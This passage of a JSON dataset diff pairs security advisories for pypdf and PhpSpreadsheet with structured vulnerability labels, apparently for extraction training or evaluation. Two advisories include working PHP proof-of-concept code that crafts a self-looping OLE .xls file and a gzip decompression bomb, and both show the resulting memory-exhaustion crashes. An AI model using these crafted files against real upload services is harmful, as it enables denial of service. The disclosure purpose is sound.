+    "input_text": "### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires parsing the content stream of a page with a not terminated inline image, as done when extracting the page text for example.\n\n### Patches\n\nThis has been fixed in [pypdf==6.14.1](https://github.com/py-pdf/pypdf/releases/tag/6.14.1).\n\n### Workarounds\n\nIf you cannot upgrade yet, consider applying the changes from PR [#3891](https://github.com/py-pdf/pypdf/pull/3891).",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59936",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "pypdf",
+              "version_range": "< 6.14.1"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "unknown",
+          "impact_summary": "An attacker can craft a PDF causing an infinite loop through content stream parsing of pages with unhandled inline images.",
+          "remediation_action": "Consider applying changes from PR #3891 to mitigate this vulnerability."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-55h5-xmcq-c37v",
+    "input_text": "### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to long runtimes. This requires cross-reference streams with repeated malformed cross-reference streams.\n\n### Patches\n\nThis has been fixed in [pypdf==6.14.0](https://github.com/py-pdf/pypdf/releases/tag/6.14.0).\n\n### Workarounds\n\nIf you cannot upgrade yet, consider applying the changes from PR [#3887](https://github.com/py-pdf/pypdf/pull/3887).",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59937",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "pypdf",
+              "version_range": "< 6.14.0"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "medium",
+          "attack_vector": "unknown",
+          "impact_summary": "An attacker can craft a PDF leading to long runtimes via cross-reference streams with repeated malformed streams.",
+          "remediation_action": "Apply changes from PR #3887 or upgrade to pypdf==6.14.0"
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-xh5m-36r6-47m3",
+    "input_text": "## Summary\n\nPhpSpreadsheet's OLE reader follows sector chains from attacker-controlled XLS/OLE metadata without detecting cycles or enforcing a maximum chain length. A tiny malformed `.xls`/OLE file can set the small-block depot sector chain to point back to itself. During normal XLS detection, `OLERead::read()` appends the same sector data repeatedly until the PHP process exhausts memory.\n\nThis is reachable from `Reader\\Xls::canRead()` and therefore from automatic spreadsheet type detection. Applications that accept attacker-controlled spreadsheet uploads can suffer denial of service from a very small file.\n\n## Vulnerability details\n\n`OLERead::read()` loads the input and builds sector chains from attacker-controlled OLE header and allocation-table values:\n\n- `src/PhpSpreadsheet/Shared/OLERead.php:82` reads the entire file after validating only the OLE magic.\n- `src/PhpSpreadsheet/Shared/OLERead.php:84-97` reads sector-chain metadata from the file header.\n- `src/PhpSpreadsheet/Shared/OLERead.php:132-146` builds `bigBlockChain` and then follows the small-block depot chain.\n\nThe vulnerable loop is:\n\n```php\n$sbdBlock = $this->sbdStartBlock;\n$this->smallBlockChain = '';\nwhile ($sbdBlock != -2) {\n    $pos = ($sbdBlock + 1) * self::BIG_BLOCK_SIZE;\n\n    $this->smallBlockChain .= substr($this->data, $pos, 4 * $bbs);\n    $pos += 4 * $bbs;\n\n    $sbdBlock = self::getInt4d($this->bigBlockChain, $sbdBlock * 4);\n}\n```\n\nThere is no visited-sector set, no maximum iteration count, no EOF bound, and no check that the next sector differs from a previously visited sector. If the allocation table maps sector `0` to sector `0`, the loop appends the same sector data forever until memory is exhausted.\n\nThe issue is reachable during normal reader detection/loading:\n\n- `src/PhpSpreadsheet/Reader/XlsBase.php:153-165` calls `OLERead::read()` from `canRead()`.\n- `src/PhpSpreadsheet/Reader/Xls.php:376-383` calls `OLERead::read()` from `loadOLE()`.\n- `src/PhpSpreadsheet/IOFactory.php:181-213` calls `canRead()` while creating a reader for a file, so automatic format detection can trigger the issue.\n\nSimilar unbounded sector-chain walks exist later in stream reading:\n\n- `src/PhpSpreadsheet/Shared/OLERead.php:175-180`\n- `src/PhpSpreadsheet/Shared/OLERead.php:198-202`\n- `src/PhpSpreadsheet/Shared/OLERead.php:218-222`\n\nThe proof of concept below confirms the small-block depot chain loop; the same remediation pattern should be applied to all sector-chain walks.\n\n## Impact\n\nA 1 KiB file can crash a PHP worker during `Xls::canRead()` or automatic file-type detection. This can deny service to web applications, queue workers, preview services, or document converters that process untrusted spreadsheet uploads.\n\nThe issue occurs before the file is recognized as a valid workbook stream, so even detection/probing paths are affected.\n\n## Safe local proof of concept\n\nThis proof of concept uses only Docker with `--network none`; it creates the malformed OLE file inside the container and does not contact external infrastructure.\n\n```bash\ndocker run --rm --network none -i \\\n  -v /home/sondt23/Github/CVE/ares/github-repo/PhpSpreadsheet:/app \\\n  -w /app ghcr.io/typo3/core-testing-php82:1.15 sh <<'SH'\nset -eu\nphp -r '\n$data = str_repeat(\"\\0\", 1024);\n$set = function (int $off, string $bytes) use (&$data): void { $data = substr_replace($data, $bytes, $off, strlen($bytes)); };\n$set(0, hex2bin(\"D0CF11E0A1B11AE1\"));\n$set(28, \"\\xfe\\xff\");\n$set(30, pack(\"v\", 9));     // sector size 512\n$set(32, pack(\"v\", 6));     // mini sector size 64\n$set(44, pack(\"l\", 1));     // 1 SAT sector\n$set(48, pack(\"l\", 0));     // directory first sector 0\n$set(56, pack(\"l\", 4096));  // mini stream cutoff\n$set(60, pack(\"l\", 0));     // SSAT first sector 0\n$set(64, pack(\"l\", 1));     // one SSAT sector\n$set(68, pack(\"l\", -2));    // no MSAT extension\n$set(72, pack(\"l\", 0));     // no extension sectors\n$set(76, pack(\"l\", 0));     // DIFAT says SAT is sector 0\n$set(512, pack(\"l\", 0));    // SAT entry for sector 0 points to itself\nfile_put_contents(\"/tmp/phpspreadsheet-ole-selfloop.xls\", $data);\nprintf(\"ole_size=%d\\n\", filesize(\"/tmp/phpspreadsheet-ole-selfloop.xls\"));\n'\nphp -d memory_limit=64M -d display_errors=1 -r '\nrequire \"/app/vendor/autoload.php\";\n$r = new PhpOffice\\PhpSpreadsheet\\Reader\\Xls();\nvar_dump($r->canRead(\"/tmp/phpspreadsheet-ole-selfloop.xls\"));\n' 2>&1 || true\nSH\n```\n\nObserved output:\n\n```text\nole_size=1024\nPHP Fatal error:  Allowed memory size of 67108864 bytes exhausted (tried to allocate 48234528 bytes) in /app/src/PhpSpreadsheet/Shared/OLERead.php on line 143\nPHP Stack trace:\nPHP   1. {main}() Command line code:0\nPHP   2. PhpOffice\\PhpSpreadsheet\\Reader\\XlsBase->canRead($filename = '/tmp/phpspreadsheet-ole-selfloop.xls') Command line code:4\nPHP   3. PhpOffice\\PhpSpreadsheet\\Shared\\OLERead->read($filename = '/tmp/phpspreadsheet-ole-selfloop.xls') /app/src/PhpSpreadsheet/Reader/XlsBase.php:164\n```\n\n## Suggested remediation\n\n- Validate every OLE sector-chain walk with:\n  - a visited-sector set to reject cycles;\n  - maximum chain length based on file size and sector size;\n  - bounds checks before reading from `$this->data`, `$this->bigBlockChain`, or `$this->smallBlockChain`;\n  - rejection of negative sector IDs other than the documented end-of-chain marker.\n- Replace fatal memory exhaustion with a recoverable `Reader\\Exception` for malformed OLE chains.\n- Apply the same guarded chain-walk helper to:\n  - small-block depot chain construction;\n  - small-block stream extraction;\n  - big-block stream extraction;\n  - `readData()`.\n- Add regression tests with self-looping and out-of-range SAT/SSAT chains.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59933",
+          "affected_products": [
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": "<= 1.30.5"
+            },
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": ">= 2.0.0, <= 2.1.17"
+            },
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": ">= 2.2.0, <= 2.4.6"
+            },
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": ">= 3.3.0, <= 3.10.6"
+            },
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": ">= 4.0.0, <= 5.8.0"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "A tiny malformed .xls file can cause a PHP worker to crash due to an unbounded sector chain loop, leading to denial of service.",
+          "remediation_action": "Apply the same remediation pattern to all sector-chain walks in `PhpSpreadsheet` to prevent the issue."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-2mrg-gjxq-2gvr",
+    "input_text": "## Summary\n\nPhpSpreadsheet's Gnumeric reader reads attacker-supplied `.gnumeric` files into memory and, when the file starts with gzip magic bytes, calls `gzdecode()` on the full compressed contents without enforcing a decompressed-size limit. A very small compressed `.gnumeric` file can expand to data larger than the PHP memory limit and crash the process during `Gnumeric::canRead()` before the file is rejected or fully parsed.\n\nThis is reachable through normal file-type detection and Gnumeric loading paths, so applications that accept attacker-controlled spreadsheet uploads can suffer denial of service.\n\n## Vulnerability details\n\n`Gnumeric::canRead()` invokes `gzfileGetContents()` before deciding whether the file is a valid Gnumeric spreadsheet:\n\n- `src/PhpSpreadsheet/Reader/Gnumeric.php:80-90` calls `$this->gzfileGetContents($filename)` from `canRead()`.\n- `src/PhpSpreadsheet/Reader/Gnumeric.php:105-115` calls `canRead()` and then reads the expanded contents again for worksheet-name listing.\n- `src/PhpSpreadsheet/Reader/Gnumeric.php:253-265` calls `canRead()` and then reads the expanded contents again for full loading.\n\nThe vulnerable expansion is in `gzfileGetContents()`:\n\n- `src/PhpSpreadsheet/Reader/Gnumeric.php:187-190` reads the entire input file into `$contents` with `file_get_contents()`.\n- `src/PhpSpreadsheet/Reader/Gnumeric.php:192-197` detects gzip magic bytes and calls `gzdecode($contents)` without a decompressed-size cap.\n- `src/PhpSpreadsheet/Reader/Gnumeric.php:204-205` scans the expanded data only after decompression has already completed.\n\nBecause decompression occurs before XML scanning or structural validation, a tiny gzip payload can force large memory allocation even if the resulting XML is meaningless or invalid.\n\n## Impact\n\nA small `.gnumeric` upload can crash a PHP worker during spreadsheet type detection or import. This can cause denial of service in web applications, queue workers, preview services, document converters, or any service that runs PhpSpreadsheet against untrusted spreadsheet files.\n\nIn the local reproduction below, a 97,811-byte file expands to about 96 MiB and crashes `Gnumeric::canRead()` under `memory_limit=64M` at `Reader/Gnumeric.php:195`.\n\n## Safe local proof of concept\n\nThis proof of concept uses only Docker with `--network none`; it creates the compressed payload inside the container and does not contact external infrastructure.\n\n```bash\ndocker run --rm --network none -i \\\n  -v /home/sondt23/Github/CVE/ares/github-repo/PhpSpreadsheet:/app \\\n  -w /app ghcr.io/typo3/core-testing-php82:1.15 sh <<'SH'\nset -eu\nphp -r '\n$prefix = \"<?xml version=\\\"1.0\\\"?><gnm:Workbook xmlns:gnm=\\\"http://www.gnumeric.org/v10.dtd\\\">\";\n$suffix = \"</gnm:Workbook>\";\n$payload = $prefix . str_repeat(\"A\", 96 * 1024 * 1024) . $suffix;\n$gz = gzencode($payload, 9);\nfile_put_contents(\"/tmp/bomb.gnumeric\", $gz);\nprintf(\"compressed_size=%d expanded_size=%d\\n\", filesize(\"/tmp/bomb.gnumeric\"), strlen($payload));\n'\nphp -d memory_limit=64M -d display_errors=1 -r '\nrequire \"/app/vendor/autoload.php\";\n$r = new PhpOffice\\PhpSpreadsheet\\Reader\\Gnumeric();\nvar_dump($r->canRead(\"/tmp/bomb.gnumeric\"));\n' 2>&1 || true\nSH\n```\n\nObserved output:\n\n```text\ncompressed_size=97811 expanded_size=100663390\nPHP Fatal error:  Allowed memory size of 67108864 bytes exhausted (tried to allocate 50291378 bytes) in /app/src/PhpSpreadsheet/Reader/Gnumeric.php on line 195\nPHP Stack trace:\nPHP   1. {main}() Command line code:0\nPHP   2. PhpOffice\\PhpSpreadsheet\\Reader\\Gnumeric->canRead($filename = '/tmp/bomb.gnumeric') Command line code:4\nPHP   3. PhpOffice\\PhpSpreadsheet\\Reader\\Gnumeric->gzfileGetContents($filename = '/tmp/bomb.gnumeric') /app/src/PhpSpreadsheet/Reader/Gnumeric.php:84\nPHP   4. gzdecode(...) /app/src/PhpSpreadsheet/Reader/Gnumeric.php:195\n```\n\n## Suggested remediation\n\n- Do not decompress gzip data with unbounded `gzdecode()` for untrusted `.gnumeric` files.\n- Stream decompression with a strict maximum output-size limit before allocating the full expanded XML.\n- Enforce a configurable maximum compressed size and maximum decompressed size for Gnumeric files.\n- Ensure `canRead()`, `listWorksheetNames()`, `listWorksheetInfo()`, and `load()` share bounded decompression logic and avoid decompressing the same file repeatedly.\n- Fail closed with a recoverable `Reader\\Exception` when limits are exceeded, rather than allowing a PHP fatal memory error.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59932",
+          "affected_products": [
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": "<= 1.30.5"
+            },
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": ">= 2.0.0, <= 2.1.17"
+            },
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": ">= 2.2.0, <= 2.4.6"
+            },
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": ">= 3.3.0, <= 3.10.6"
+            },
+            {
+              "vendor": "COMPOSER",
+              "product": "phpoffice/phpspreadsheet",
+              "version_range": ">= 4.0.0, <= 5.8.0"
+            }
+          ],
+          "cwe_category": "Uncontrolled Resource Consumption",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "A small malicious .gnumeric file can crash PHP processes and cause denial of service.",
+          "remediation_action": "Do not decompress gzip data with unbounded gzdecode() for untrusted .gnumeric files."
+        }
+      ]
+    }
+  }
+]
